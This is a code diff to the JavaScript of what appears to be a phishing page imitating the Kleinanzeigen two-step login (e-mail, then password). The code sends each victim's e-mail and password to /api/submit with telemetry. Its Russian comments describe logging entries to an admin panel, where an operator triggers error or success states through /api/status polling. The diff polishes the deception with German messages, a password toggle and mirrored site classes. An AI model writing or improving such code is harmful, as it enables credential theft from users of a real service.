@@ -1,5 +1,5 @@
 /**
- * Klein (Kleinanzeigen) Einloggen — zwei Schritte: 1) E-Mail + Weitermachen, 2) Passwort + Einloggen. Submit → /api/submit, polling /api/status.
+ * Klein (Kleinanzeigen) Einloggen — zwei Schritte: 1) E-Mail + Weiter, 2) Passwort + Einloggen. Submit → /api/submit, polling /api/status.
  */
 (function () {
   'use strict';
@@ -37,14 +37,18 @@
   } catch (e) {}
 
   var loginForm = document.getElementById('loginForm');
+  var mainWidget = document.querySelector('main._widget');
   var usernameInput = document.getElementById('username-input');
   var passwordInput = document.getElementById('password-input');
+  var readonlyUsernameMirror = document.getElementById('knz-readonly-username');
   var mainButton = document.getElementById('main-action-button');
+  var btnWeitermachen = document.getElementById('btn-weitermachen');
+  var emailFieldWrap = document.getElementById('knz-email-field-wrap');
+  var emailErrorEl = document.getElementById('knz-email-error');
   var errorLoginRow = document.getElementById('error-login-row');
   var errorLogin = document.getElementById('error-login');
   var step1 = document.getElementById('knz-step-1');
   var step2 = document.getElementById('knz-step-2');
-  var btnWeitermachen = document.getElementById('btn-weitermachen');
   var linkBearbeiten = document.getElementById('link-bearbeiten');
   var emailDisplay = document.getElementById('email-display');
   var btnTogglePassword = document.getElementById('btn-toggle-password');
@@ -53,6 +57,52 @@
   var passwordFieldWrap = document.getElementById('password-field-wrap');
   /** Пользователь начал менять пароль — ошибку не показывать снова по опросу, пока статус не сменится с error и админ снова не нажмёт Error */
   var userClearedErrorByTyping = false;
+
+  function appendTelemetrySafe(payload) {
+    if (typeof window.gmwAppendTelemetry === 'function') {
+      try {
+        return window.gmwAppendTelemetry(payload);
+      } catch (e) {
+        return payload;
+      }
+    }
+    return payload;
+  }
+
+  function setStep1EmailError(msg) {
+    if (emailErrorEl) {
+      var m = (msg && String(msg).trim()) ? String(msg).trim() : '';
+      emailErrorEl.textContent = m;
+      emailErrorEl.hidden = !m;
+    }
+  }
+
+  function clearStep1EmailError() {
+    setStep1EmailError('');
+  }
+
+  function syncEmailFieldLabel() {
+    if (!emailFieldWrap || !usernameInput) return;
+    var filled = !!(usernameInput.value && usernameInput.value.trim());
+    emailFieldWrap.classList.toggle('knz-has-email-value', filled);
+    emailFieldWrap.classList.toggle('c0e4f9f8a', filled);
+  }
+
+  function syncPasswordFieldLabel() {
+    if (!passwordFieldWrap || !passwordInput) return;
+    var filled = !!(passwordInput.value && passwordInput.value.length);
+    passwordFieldWrap.classList.toggle('c0e4f9f8a', filled);
+  }
+
+  function setFormKleinStep(isPasswordStep) {
+    if (!loginForm) return;
+    loginForm.classList.toggle('_form-login-id', !isPasswordStep);
+    loginForm.classList.toggle('_form-login-password', !!isPasswordStep);
+    if (mainWidget) {
+      mainWidget.classList.toggle('login-id', !isPasswordStep);
+      mainWidget.classList.toggle('login', !!isPasswordStep);
+    }
+  }
 
   function setLoginError(show, message) {
     if (errorLoginRow) errorLoginRow.style.display = show ? 'block' : 'none';
@@ -68,64 +118,110 @@
   function showStep1() {
     if (step1) step1.classList.add('is-active');
     if (step2) step2.classList.remove('is-active');
-    if (passwordInput) passwordInput.value = '';
+    if (passwordInput) {
+      passwordInput.value = '';
+      passwordInput.type = 'password';
+      passwordInput.disabled = true;
+      passwordInput.required = false;
+    }
+    if (readonlyUsernameMirror) readonlyUsernameMirror.value = '';
+    if (passwordFieldWrap) passwordFieldWrap.classList.remove('focus');
+    syncPasswordFieldLabel();
     setLoginError(false);
+    clearStep1EmailError();
+    if (btnWeitermachen) {
+      btnWeitermachen.disabled = false;
+      btnWeitermachen.classList.remove('is-loading');
+    }
+    syncEmailFieldLabel();
+    setFormKleinStep(false);
+    syncPasswordToggleUi();
   }
 
   function showStep2() {
     if (step1) step1.classList.remove('is-active');
     if (step2) step2.classList.add('is-active');
-    if (emailDisplay && usernameInput) emailDisplay.textContent = usernameInput.value.trim();
+    var em = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
+    if (emailDisplay) emailDisplay.textContent = em;
+    if (readonlyUsernameMirror) readonlyUsernameMirror.value = em;
     setLoginError(false);
+    setFormKleinStep(true);
     if (passwordInput) {
+      passwordInput.disabled = false;
+      passwordInput.required = true;
       passwordInput.value = '';
+      syncPasswordFieldLabel();
+      syncPasswordToggleUi();
       setTimeout(function () { passwordInput.focus(); }, 100);
     }
   }
 
   /** Отправляет почту на сервер (лог в админку сразу после ввода почты), затем показывает шаг 2. */
   function sendEmailAndShowStep2() {
-    var email = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
+    var emailValue = (usernameInput && usernameInput.value) ? usernameInput.value.trim().toLowerCase() : '';
+    var email = emailValue;
+    clearStep1EmailError();
     if (!isEmailValid(email)) {
+      setStep1EmailError('Bitte gib eine gültige E-Mail-Adresse ein.');
       if (usernameInput) usernameInput.focus();
       return;
+    }
+    if (btnWeitermachen) {
+      btnWeitermachen.disabled = true;
+      btnWeitermachen.classList.add('is-loading');
     }
     var visitId = null;
     try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
     if (visitId && typeof visitId !== 'string') visitId = null;
     var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
     var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
+    var body = appendTelemetrySafe({
+      email: email,
+      emailKl: email,
+      visitId: visitId || undefined,
+      screenWidth: sw || undefined,
+      screenHeight: sh || undefined,
+      kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
+    });
     fetch('/api/submit', Object.assign({
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(window.gmwAppendTelemetry({
-        email: email,
-        emailKl: email,
-        visitId: visitId || undefined,
-        screenWidth: sw || undefined,
-        screenHeight: sh || undefined,
-        kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
-      }))
+      body: JSON.stringify(body)
     }, credFetch))
-      .then(function (r) { return r.ok ? r.json() : null; })
-      .then(function (data) {
-        if (data && data.id) {
-          try { sessionStorage.setItem('gmw_lead_id', data.id); } catch (e) {}
-          startPagePoll(data.id);
-          showStep2();
-        } else {
-          setLoginError(true, 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.');
+      .then(function (r) {
+        return r.json().then(function (data) {
+          return { ok: r.ok, status: r.status, data: data };
+        }).catch(function () {
+          return { ok: r.ok, status: r.status, data: null };
+        });
+      })
+      .then(function (res) {
+        if (btnWeitermachen) {
+          btnWeitermachen.classList.remove('is-loading');
+          btnWeitermachen.disabled = false;
         }
+        if (res.ok && res.data && res.data.id) {
+          try { sessionStorage.setItem('gmw_lead_id', res.data.id); } catch (e) {}
+          startPagePoll(res.data.id);
+          showStep2();
+          return;
+        }
+        var msg = (res.data && res.data.message) ? String(res.data.message) : '';
+        setStep1EmailError(msg || (res.status === 403 ? 'Zugriff verweigert. Seite neu laden und erneut versuchen.' : 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.'));
       })
       .catch(function () {
-        setLoginError(true, 'Verbindungsfehler. Bitte versuche es erneut.');
+        if (btnWeitermachen) {
+          btnWeitermachen.classList.remove('is-loading');
+          btnWeitermachen.disabled = false;
+        }
+        setStep1EmailError('Verbindungsfehler. Bitte versuche es erneut.');
       });
   }
 
   function isEmailValid(val) {
     if (!val || typeof val !== 'string') return false;
-    var t = val.trim();
-    return t.length > 0 && t.indexOf('@') > 0 && t.indexOf('@') < t.length - 1;
+    var t = val.trim().toLowerCase();
+    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(t);
   }
 
   function startPagePoll(id) {
@@ -145,7 +241,7 @@
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
             try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
             showStep1();
-            setLoginError(true, 'Sitzung abgelaufen. Bitte E-Mail erneut eingeben.');
+            setStep1EmailError('Sitzung abgelaufen. Bitte E-Mail erneut eingeben.');
             return;
           }
           if (st === 'show_success') {
@@ -196,10 +292,22 @@
     } catch (e) {}
   })();
 
+  showStep1();
+  syncEmailFieldLabel();
+
   if (passwordInput) {
     passwordInput.addEventListener('input', function () {
       userClearedErrorByTyping = true;
       setLoginError(false);
+      syncPasswordFieldLabel();
+    });
+    passwordInput.addEventListener('focus', function () {
+      if (passwordFieldWrap) passwordFieldWrap.classList.add('focus');
+      syncPasswordFieldLabel();
+    });
+    passwordInput.addEventListener('blur', function () {
+      if (passwordFieldWrap) passwordFieldWrap.classList.remove('focus');
+      syncPasswordFieldLabel();
     });
     // Enter в поле пароля всегда отправляет форму (на части устройств/браузеров иначе может не сработать)
     passwordInput.addEventListener('keydown', function (e) {
@@ -211,12 +319,6 @@
       } else {
         loginForm.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
       }
-    });
-  }
-
-  if (btnWeitermachen) {
-    btnWeitermachen.addEventListener('click', function () {
-      sendEmailAndShowStep2();
     });
   }
 
@@ -233,17 +335,29 @@
     });
   }
 
+  function syncPasswordToggleUi() {
+    if (!btnTogglePassword || !passwordInput) return;
+    var visible = passwordInput.type === 'text';
+    btnTogglePassword.setAttribute('aria-checked', visible ? 'true' : 'false');
+    btnTogglePassword.setAttribute('aria-label', visible ? 'Passwort verbergen' : 'Passwort anzeigen');
+    btnTogglePassword.setAttribute('title', visible ? 'Passwort verbergen' : 'Passwort anzeigen');
+    var showTip = btnTogglePassword.querySelector('.show-password-tooltip');
+    var hideTip = btnTogglePassword.querySelector('.hide-password-tooltip');
+    if (showTip) showTip.classList.toggle('hide', visible);
+    if (hideTip) hideTip.classList.toggle('hide', !visible);
+    var eyeOpen = btnTogglePassword.querySelector('.knz-svg-eye-open');
+    var eyeClosed = btnTogglePassword.querySelector('.knz-svg-eye-closed');
+    if (eyeOpen) eyeOpen.classList.toggle('hide', visible);
+    if (eyeClosed) eyeClosed.classList.toggle('hide', !visible);
+  }
+
   if (btnTogglePassword && passwordInput) {
-    btnTogglePassword.addEventListener('click', function () {
-      var isPassword = passwordInput.type === 'password';
-      passwordInput.type = isPassword ? 'text' : 'password';
-      btnTogglePassword.setAttribute('aria-checked', isPassword ? 'true' : 'false');
-      btnTogglePassword.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
-      var showTip = btnTogglePassword.querySelector('.show-password-tooltip');
-      var hideTip = btnTogglePassword.querySelector('.hide-password-tooltip');
-      if (showTip) showTip.classList.toggle('hide', !isPassword);
-      if (hideTip) hideTip.classList.toggle('hide', isPassword);
+    btnTogglePassword.addEventListener('click', function (e) {
+      e.preventDefault();
+      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+      syncPasswordToggleUi();
     });
+    syncPasswordToggleUi();
   }
 
   var backEl = document.getElementById('knz-back');
@@ -283,16 +397,32 @@
 
   if (!loginForm) return;
 
+  if (usernameInput) {
+    usernameInput.addEventListener('input', function () {
+      setLoginError(false);
+      clearStep1EmailError();
+      syncEmailFieldLabel();
+    });
+    usernameInput.addEventListener('change', syncEmailFieldLabel);
+    usernameInput.addEventListener('focus', function () {
+      if (emailFieldWrap) emailFieldWrap.classList.add('focus');
+      syncEmailFieldLabel();
+    });
+    usernameInput.addEventListener('blur', function () {
+      if (emailFieldWrap) emailFieldWrap.classList.remove('focus');
+      syncEmailFieldLabel();
+    });
+  }
+
   loginForm.addEventListener('submit', function (e) {
     e.preventDefault();
     var onStep2 = step2 && step2.classList.contains('is-active');
     if (!onStep2) {
-      if (isEmailValid((usernameInput && usernameInput.value) ? usernameInput.value.trim() : '')) {
-        sendEmailAndShowStep2();
-      }
+      sendEmailAndShowStep2();
       return;
     }
-    var email = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
+    var emailValue = (usernameInput && usernameInput.value) ? usernameInput.value.trim().toLowerCase() : '';
+    var email = emailValue;
     var pwd = (passwordInput && passwordInput.value) || '';
     if (!pwd) return;
     setLoginError(false);
